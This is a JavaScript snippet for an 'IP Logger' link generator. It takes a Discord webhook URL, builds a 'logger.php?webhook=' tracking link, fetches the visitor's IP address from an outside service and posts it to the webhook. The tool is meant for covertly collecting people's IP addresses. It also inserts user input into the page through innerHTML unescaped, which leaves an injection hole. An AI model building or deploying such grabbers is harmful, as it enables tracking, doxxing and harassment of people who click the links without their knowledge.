document.getElementById("webhook-form").addEventListener("submit", function(event) {
  event.preventDefault();

  var webhookUrl = document.getElementById("webhook-input").value;
  var loggerLink = window.location.href + "logger.php?webhook=" + encodeURIComponent(webhookUrl);

  document.getElementById("logger-link").innerHTML = "Your IP Logger link: <a href='" + loggerLink + "'>" + loggerLink + "</a>";

  fetch("https://api.ipify.org?format=json")
    .then(function(response) {
      return response.json();
    })
    .then(function(data) {
      var ip = data.ip;
      var payload = {
        content: "IP address: " + ip
      };
      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
        .then(function(response) {
          if (response.ok) {
            console.log("IP address logged to Discord successfully.");
          } else {
            console.error("Error logging IP address to Discord. Status code: " + response.status);
          }
        })
        .catch(function(error) {
          console.error("Error logging IP address to Discord:", error);
        });
    })
    .catch(function(error) {
      console.error("Error retrieving IP address:", error);
    });
});
